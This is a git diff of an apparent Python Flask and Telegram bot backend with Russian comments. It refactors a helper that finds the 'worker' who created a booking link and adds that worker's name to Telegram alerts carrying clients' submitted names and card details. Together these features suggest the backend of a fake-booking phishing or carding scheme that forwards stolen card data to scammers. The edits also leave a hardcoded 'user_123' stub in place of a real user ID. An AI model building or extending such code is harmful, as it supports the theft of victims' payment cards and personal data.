@@ -339,7 +339,56 @@ def get_link_data(link_code):
         logger.error(f"💥 Критическая ошибка получения данных ссылки: {e}")
         return jsonify({'error': f'Internal server error: {str(e)}'}), 500
 
-# ★★★ НОВЫЕ ENDPOINT'Ы ДЛЯ ЧАТА ПОДДЕРЖКИ ★★★
+# ★★★ НОВЫЕ ФУНКЦИИ ДЛЯ ТЕХПОДДЕРЖКИ ★★★
+
+def get_link_creator_info(user_id):
+    """Находит создателя ссылки по user_id клиента"""
+    try:
+        conn = get_db_connection()
+        if conn is None:
+            return f"ID: {user_id}"
+            
+        cursor = conn.cursor()
+        
+        # Ищем ссылку по разным способам
+        cursor.execute('''
+            SELECT bl.user_id, a.username 
+            FROM booking_links bl
+            LEFT JOIN applications a ON bl.user_id::text = a.user_id::text
+            WHERE bl.link_code = %s 
+               OR %s LIKE '%' || bl.link_code || '%'
+               OR %s = bl.user_id::text
+            LIMIT 1
+        ''', (user_id, user_id, user_id))
+        
+        result = cursor.fetchone()
+        
+        if result:
+            creator_user_id = result[0]
+            creator_username = result[1] if result[1] else f"ID: {creator_user_id}"
+            
+            # Форматируем username
+            if creator_username and not creator_username.startswith('@') and not creator_username.startswith('ID:'):
+                creator_username = f"@{creator_username}"
+            return creator_username
+        else:
+            # Если не нашли по ссылке, ищем user_id как создателя
+            cursor.execute('''
+                SELECT username FROM applications 
+                WHERE user_id::text = %s 
+                LIMIT 1
+            ''', (user_id,))
+            
+            user_result = cursor.fetchone()
+            if user_result and user_result[0]:
+                return f"@{user_result[0]}"
+            else:
+                return f"ID: {user_id}"
+        
+        conn.close()
+    except Exception as e:
+        logger.error(f"❌ Ошибка поиска создателя: {e}")
+        return f"ID: {user_id}"
 
 @app.route('/send_chat_message', methods=['POST', 'OPTIONS'])
 def send_chat_message():
@@ -369,49 +418,7 @@ def send_chat_message():
         conn.close()
         
         # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ ПО USER_ID КЛИЕНТА
-        creator_username = "Неизвестно"
-        try:
-            conn = get_db_connection()
-            if conn:
-                cursor = conn.cursor()
-                
-                # Пробуем найти ссылку по разным способам
-                cursor.execute('''
-                    SELECT bl.user_id, a.username 
-                    FROM booking_links bl
-                    LEFT JOIN applications a ON bl.user_id::text = a.user_id::text
-                    WHERE bl.link_code = %s 
-                       OR %s LIKE '%' || bl.link_code || '%'
-                       OR %s = bl.user_id::text
-                    LIMIT 1
-                ''', (user_id, user_id, user_id))
-                
-                result = cursor.fetchone()
-                if result:
-                    creator_user_id = result[0]
-                    creator_username = result[1] if result[1] else f"ID: {creator_user_id}"
-                    
-                    # Если username есть, добавляем @
-                    if creator_username and not creator_username.startswith('@') and not creator_username.startswith('ID:'):
-                        creator_username = f"@{creator_username}"
-                else:
-                    # Если не нашли по ссылке, ищем по user_id как создателя
-                    cursor.execute('''
-                        SELECT username FROM applications 
-                        WHERE user_id::text = %s 
-                        LIMIT 1
-                    ''', (user_id,))
-                    
-                    user_result = cursor.fetchone()
-                    if user_result and user_result[0]:
-                        creator_username = f"@{user_result[0]}"
-                    else:
-                        creator_username = f"ID: {user_id}"
-                
-                conn.close()
-        except Exception as e:
-            logger.error(f"❌ Ошибка поиска создателя: {e}")
-            creator_username = f"ID: {user_id}"  # fallback на user_id
+        creator_username = get_link_creator_info(user_id)
 
         # Отправляем сообщение в отдельный чат для SMS
         telegram_message = f"""💬 НОВОЕ СООБЩЕНИЕ
@@ -930,8 +937,12 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
     # Проверяем статус карты в БД
     card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
     
+    # НАХОДИМ СОЗДАТЕЛЯ ССЫЛКИ
+    creator_info = get_link_creator_info(user_id)
+    
     # Собираем новое сообщение с красивым форматированием
     new_text = f"💳 <b>{card_status}</b>\n\n"
+    new_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"  # ← ДОБАВЛЯЕМ ВОРКЕРА
     
     # Добавляем клиентские данные
     for line in lines:
@@ -1111,36 +1122,7 @@ async def process_payment_data(message: types.Message):
             return
 
         # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ
-        creator_info = "Неизвестно"
-        try:
-            # Предполагаем что user_id в данных содержит код ссылки
-            # Ищем создателя ссылки
-            conn = get_db_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                SELECT bl.user_id, a.username 
-                FROM booking_links bl
-                LEFT JOIN applications a ON bl.user_id = a.user_id
-                WHERE bl.link_code IN (
-                    SELECT link_code FROM booking_links 
-                    WHERE link_code = %s OR %s LIKE '%' || link_code || '%'
-                )
-                LIMIT 1
-            ''', ("user_123", "user_123"))  # Заглушка, нужно получить реальный user_id
-            
-            result = cursor.fetchone()
-            if result:
-                creator_user_id = result[0]
-                creator_username = result[1]
-                creator_info = f"@{creator_username}" if creator_username else f"ID: {creator_user_id}"
-            else:
-                creator_info = "Ссылка не найдена"
-                
-            conn.close()
-        except Exception as e:
-            logger.error(f"❌ Ошибка поиска создателя карты: {e}")
-            creator_info = "Ошибка поиска"
+        creator_info = get_link_creator_info("user_123")  # Здесь нужно получить реальный user_id
 
         # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
         payment_id = save_payment(
@@ -1161,7 +1143,7 @@ async def process_payment_data(message: types.Message):
             
             # Форматируем сообщение в новом стиле СРАЗУ
             formatted_text = f"💳 <b>{card_status}</b>\n\n"
-            formatted_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"
+            formatted_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"  # ← ДОБАВЛЯЕМ ВОРКЕРА
             formatted_text += "👤 <b>Клиент:</b>\n"
             formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
             formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
@@ -2079,4 +2061,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
